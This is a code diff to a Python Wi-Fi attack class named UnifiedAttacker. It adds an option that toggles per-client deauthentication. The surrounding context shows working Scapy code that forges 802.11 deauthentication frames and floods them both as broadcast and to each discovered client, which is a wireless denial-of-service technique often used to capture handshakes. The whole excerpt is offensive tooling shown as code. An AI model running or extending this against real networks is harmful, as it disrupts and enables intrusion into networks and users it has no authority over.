@@ -122,6 +122,7 @@ class UnifiedAttacker:
         output_dir: Path,
         log_cb: LogCallback,
         result_cb: ResultCallback,
+        unicast_deauth: bool = True,
     ) -> None:
         self.target = target
         self.interface = interface
@@ -129,6 +130,7 @@ class UnifiedAttacker:
         self.output_dir = output_dir
         self._log = log_cb
         self._on_result = result_cb
+        self.unicast_deauth = unicast_deauth
         self._stop = threading.Event()
         self._current_proc: Optional[subprocess.Popen] = None
         self._monitor_iface: Optional[str] = None
@@ -754,7 +756,7 @@ class UnifiedAttacker:
                 frame_bc = sc.RadioTap() / dot11_bc / sc.Dot11Deauth(reason=7)
                 sc.sendp(frame_bc, iface=iface_for_send, count=32, inter=0.05, verbose=False)
 
-                clients_snapshot = list(discovered_clients)
+                clients_snapshot = list(discovered_clients) if self.unicast_deauth else []
                 for client_mac in clients_snapshot:
                     dot11_uc = sc.Dot11(
                         type=0, subtype=12,
